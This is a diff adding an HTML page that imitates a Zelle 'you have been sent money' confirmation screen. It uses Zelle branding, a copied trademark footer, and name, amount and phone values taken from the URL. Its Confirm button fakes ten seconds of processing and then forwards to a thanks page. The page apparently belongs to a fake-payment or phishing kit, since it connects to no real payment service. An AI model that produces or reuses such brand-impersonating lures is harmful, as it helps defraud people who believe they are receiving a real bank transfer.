@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receiving Confirmation</title>
+    <style>
+        /* Reset default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Full viewport setup */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #6d1ed4; /* Purple background */
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Zelle logo styling */
+        .zelle-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 100px; /* Reduced width */
+            height: auto;
+        }
+
+        /* Main container */
+        .container {
+            text-align: center;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        /* Heading styling */
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        /* Button container */
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        /* Button styling */
+        .btn {
+            background-color: #6d1ed4;
+            color: white;
+            font-size: 16px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background-color: #5115b8;
+        }
+
+        .btn:active {
+            background-color: #3d0c8b;
+        }
+
+        /* Responsive styles */
+        @media (max-width: 400px) {
+            .buttons {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+
+        /* Decline message styling */
+        #decline-message {
+            margin-top: 20px;
+            font-style: italic;
+            color: #ddd;
+        }
+        footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: white;
+            text-align: center;
+            padding: 20px; /* Increased padding */
+            font-size: 16px; /* Increased font size */
+        }
+        #loading-message {
+            margin-top: 20px;
+            font-style: italic;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Zelle Logo -->
+    <img src="zellelogo.jpg" alt="Zelle Logo" class="zelle-logo">
+
+    <div class="container">
+        <h1><span id="name-display"></span> sent you <span id="amount-display"></span></h1>
+        <div class="buttons">
+            <a id="confirm-link" class="btn">Confirm</a>
+            <a href="#" class="btn" onclick="showDeclineMessage(); return false;">Decline</a>
+        </div>
+        <p id="decline-message" style="display:none;">You are declining the amount from <span id="declined-name"></span>.</p>
+        <div id="loading-message"></div>
+    </div>
+    <footer>
+        ©2025 Early Warning Services, LLC. All rights reserved. Zelle and the Zelle marks used herein are trademarks of Early Warning Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
+    </footer>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const name = urlParams.get('name');
+            const amount = urlParams.get('amount');
+            const phone = urlParams.get('phone');
+
+            document.getElementById('name-display').textContent = name || '[Name]';
+            document.getElementById('declined-name').textContent = name || '[Name]';
+            document.getElementById('amount-display').textContent = amount || '[Amount]';
+
+            const thanksLink = `thanks.html?name=${encodeURIComponent(name)}&amount=${encodeURIComponent(amount)}&phone=${encodeURIComponent(phone)}`;
+            document.getElementById('confirm-link').addEventListener('click', function(event) {
+                event.preventDefault(); // Prevent immediate navigation
+                document.getElementById('loading-message').textContent = "Processing... Please wait.";
+                setTimeout(() => {
+                    window.location.href = thanksLink;
+                }, 10000); // 10000 milliseconds = 10 seconds
+            });
+        });
+
+        function showDeclineMessage() {
+            document.getElementById('decline-message').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
